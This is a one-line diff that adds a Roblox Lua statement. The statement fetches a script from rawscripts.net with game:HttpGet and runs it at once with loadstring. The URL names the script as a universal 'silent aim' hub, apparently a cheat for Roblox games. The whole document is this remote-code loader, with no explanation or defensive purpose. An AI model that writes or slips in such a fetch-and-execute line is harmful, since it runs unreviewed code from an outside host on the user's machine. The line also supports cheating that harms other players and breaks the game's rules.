@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Silent-aim-Universal-Astral-Hub-17212"))()
